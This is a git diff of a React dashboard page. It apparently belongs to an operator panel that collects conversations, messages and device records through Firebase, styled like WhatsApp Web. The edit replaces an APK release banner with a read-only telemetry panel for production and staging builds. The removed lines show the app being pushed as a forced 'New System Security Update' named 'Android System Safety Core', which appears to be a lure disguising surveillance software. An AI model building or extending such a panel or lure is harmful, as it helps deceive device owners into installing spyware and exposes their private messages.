@@ -28,7 +28,7 @@ import { HARDENED_ROUTES } from "@/lib/security/routesConfig";
 export default function OverviewPage() {
   const { rawRecords, conversations, allMessages, devices, applications, loading, error } = useFirebaseData();
   const { isUnlocked } = useKeyVault();
-  const { data: appRelease } = useAppUpdate();
+  const { production: appProd, staging: appStaging } = useAppUpdate();
 
   // Compute actual metrics from live Firebase records
   const metrics = useMemo(() => {
@@ -101,52 +101,75 @@ export default function OverviewPage() {
           </div>
         )}
 
-        {/* Featured Android App Release & Live Update Manager */}
-        <div className="p-4 sm:p-5 rounded-2xl bg-gradient-to-r from-[#111b21] via-[#15232c] to-[#111b21] border border-emerald-500/30 flex flex-col md:flex-row items-start md:items-center justify-between gap-4 shadow-xl">
-          <div className="flex items-start sm:items-center gap-3.5 min-w-0">
+        {/* Featured Dual Android App Telemetry (Production & Staging Read-Only Monitor) */}
+        <div className="p-4 sm:p-5 rounded-2xl bg-gradient-to-r from-[#111b21] via-[#15232c] to-[#111b21] border border-[#222d34] flex flex-col lg:flex-row items-start lg:items-center justify-between gap-4 shadow-xl">
+          <div className="flex items-start sm:items-center gap-3.5 min-w-0 flex-1">
             <div className="w-12 h-12 rounded-2xl bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-center text-emerald-400 flex-shrink-0 shadow-lg shadow-emerald-500/10">
               <DownloadCloud className="w-6 h-6 animate-pulse" />
             </div>
-            <div className="min-w-0">
-              <div className="flex flex-wrap items-center gap-2">
-                <span className="text-xs font-bold uppercase tracking-wider text-emerald-400">Android App Release Control</span>
-                <span className="px-2 py-0.5 rounded-full bg-emerald-500/10 border border-emerald-500/20 text-emerald-300 font-mono text-[10px] font-semibold">
-                  v{appRelease?.version_name || "2.0"} (Build {appRelease?.version_code || 2})
+            <div className="min-w-0 flex-1">
+              <div className="flex flex-wrap items-center gap-2 mb-1">
+                <span className="text-xs font-bold uppercase tracking-wider text-slate-300">Android App Telemetry</span>
+                <span className="px-2 py-0.5 rounded-full bg-slate-800 text-slate-400 font-mono text-[10px] flex items-center gap-1">
+                  🔒 Read-Only
                 </span>
-                {appRelease?.force_update && (
-                  <span className="px-2 py-0.5 rounded-full bg-rose-500/10 border border-rose-500/20 text-rose-300 font-mono text-[10px]">
-                    Force Update Active
-                  </span>
-                )}
+                <span className="px-2 py-0.5 rounded-full bg-emerald-500/10 text-emerald-400 font-mono text-[10px]">
+                  Live RTDB Sync
+                </span>
               </div>
-              <h3 className="text-sm font-semibold text-white mt-1 truncate">
-                {appRelease?.title || "Android System Safety Core"}
-              </h3>
-              <p className="text-xs text-[#8696a0] truncate max-w-xl">
-                {appRelease?.message || "New System Security Update Available - Tap to install"}
-              </p>
+
+              {/* Dual Environment Badges */}
+              <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 mt-2">
+                <div className="p-2.5 rounded-xl bg-[#0b141a] border border-emerald-500/30 flex items-center justify-between gap-2">
+                  <div className="min-w-0">
+                    <span className="text-[10px] font-mono text-emerald-400 block font-semibold">● Updated App (Prod)</span>
+                    <span className="text-xs font-bold text-white truncate block">
+                      v{appProd?.version_name || "—"} <span className="text-[#8696a0] font-normal font-mono">(Build {appProd?.version_code ?? "—"})</span>
+                    </span>
+                  </div>
+                  {appProd?.apk_url && (
+                    <a
+                      href={appProd.apk_url}
+                      target="_blank"
+                      rel="noreferrer"
+                      className="p-1.5 rounded-lg bg-[#202c33] hover:bg-[#2a3942] text-[#8696a0] hover:text-emerald-400 transition"
+                      title="Download Production APK"
+                    >
+                      <ExternalLink className="w-3.5 h-3.5" />
+                    </a>
+                  )}
+                </div>
+
+                <div className="p-2.5 rounded-xl bg-[#0b141a] border border-indigo-500/30 flex items-center justify-between gap-2">
+                  <div className="min-w-0">
+                    <span className="text-[10px] font-mono text-indigo-400 block font-semibold">● App Updated Staging</span>
+                    <span className="text-xs font-bold text-white truncate block">
+                      v{appStaging?.version_name || "—"} <span className="text-[#8696a0] font-normal font-mono">(Build {appStaging?.version_code ?? "—"})</span>
+                    </span>
+                  </div>
+                  {appStaging?.apk_url && (
+                    <a
+                      href={appStaging.apk_url}
+                      target="_blank"
+                      rel="noreferrer"
+                      className="p-1.5 rounded-lg bg-[#202c33] hover:bg-[#2a3942] text-[#8696a0] hover:text-indigo-400 transition"
+                      title="Download Staging APK"
+                    >
+                      <ExternalLink className="w-3.5 h-3.5" />
+                    </a>
+                  )}
+                </div>
+              </div>
             </div>
           </div>
 
-          <div className="flex items-center gap-2.5 w-full md:w-auto flex-shrink-0">
-            {appRelease?.apk_url && (
-              <a
-                href={appRelease.apk_url}
-                target="_blank"
-                rel="noreferrer"
-                className="px-3.5 py-2 rounded-xl bg-[#202c33] hover:bg-[#2a3942] text-xs font-medium text-slate-200 hover:text-white border border-[#2a3942] transition flex items-center gap-1.5"
-                title="Test APK download link"
-              >
-                <ExternalLink className="w-3.5 h-3.5 text-emerald-400" />
-                <span className="hidden sm:inline">Test APK</span>
-              </a>
-            )}
+          <div className="flex items-center gap-2.5 w-full lg:w-auto flex-shrink-0">
             <Link
               href={HARDENED_ROUTES.APP_UPDATES}
-              className="flex-1 md:flex-initial inline-flex items-center justify-center gap-2 px-4 py-2 rounded-xl bg-[#00a884] hover:bg-[#02906f] active:scale-95 text-white text-xs font-semibold shadow-lg shadow-emerald-600/20 transition cursor-pointer"
+              className="w-full lg:w-auto inline-flex items-center justify-center gap-2 px-4 py-2.5 rounded-xl bg-[#202c33] hover:bg-[#2a3942] text-white text-xs font-semibold border border-[#2a3942] shadow-md transition cursor-pointer"
             >
-              <span>Manage & Update Release</span>
-              <ArrowUpRight className="w-4 h-4" />
+              <span>Inspect All Values</span>
+              <ArrowUpRight className="w-4 h-4 text-emerald-400" />
             </Link>
           </div>
         </div>
